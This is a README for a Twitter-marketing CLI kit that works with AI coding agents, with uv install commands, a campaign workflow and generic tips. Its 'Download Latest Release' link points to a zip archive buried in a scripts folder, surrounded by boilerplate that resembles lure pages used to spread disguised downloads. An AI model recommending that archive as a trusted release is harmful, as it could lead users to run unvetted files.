# 🎉 twitter-init-kit - Simplify Your Twitter Marketing

## 🚀 Getting Started

Welcome to the **twitter-init-kit**! This is your go-to toolkit for creating and managing Twitter marketing campaigns. Whether you’re launching an AI SaaS product or looking to boost your online presence, this tool offers a straightforward way to connect with your audience.

## 🛠️ Features

- **Spec-Driven Workflows**: Follow structured templates to create impactful campaigns.
- **AI Integration**: Leverage AI agents like Claude Code and Cursor to enhance your marketing strategies.
- **CLI Support**: Use command line tools for quick and easy access to the kit's features.
- **Growth Loop Templates**: Access pre-made templates specifically designed to encourage user engagement and growth.
- **Founder-Led Content**: Create authentic content that showcases your brand's voice effectively.
- **Evidence Loops**: Use optional TweetClaw and OpenClaw workflows to search tweets,
  inspect replies, and monitor launch language before writing campaign specs.

## 📥 Install

Install the CLI directly from this repository:

```bash
uv tool install --from git+https://github.com/BienvenuONIODJE/twitter-init-kit.git twitterify-cli
```

Initialize a campaign workspace:

```bash
twitterify init my-twitter-launch --ai claude
```

You can also run the CLI without installing it first:

```bash
uvx --from git+https://github.com/BienvenuONIODJE/twitter-init-kit.git twitterify init my-twitter-launch
```

You can also download the packaged starter archive:

[Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)

## 🖥️ System Requirements

Before installing, ensure your device meets the following requirements:

- **Operating System**: Windows 10 or later, macOS 10.15 or later, Ubuntu 18.04 or later.
- **RAM**: At least 4 GB recommended.
- **Disk Space**: Minimum of 200 MB of free space for installation.
- **Internet Connection**: Required for accessing online features and updates.

## 📚 How to Use

1. **Create a Workspace**: Run `twitterify init` for a new campaign folder.

2. **Open Your Agent**: Start Claude Code, Codex, Cursor, or another supported AI agent in the workspace.

3. **Run the Commands**: Use `/twitterkit.constitution`, `/twitterkit.specify`,
   `/twitterkit.plan`, `/twitterkit.tasks`, and `/twitterkit.implement`.

4. **Ground the Plan**: Add evidence from your market, customer replies, and
   optional TweetClaw research before finalizing tasks.

## 📊 Tips for Effective Use

- **Plan Ahead**: Think about your marketing objectives before starting a campaign. This will help you choose the right templates and strategies.
- **Experiment with AI**: Utilize AI-driven features to optimize your campaigns. Experiment with different approaches to see what works best for your audience.
- **Analyze Results**: After your campaign, review the results. Use built-in analytics tools to understand what resonated most with your audience.
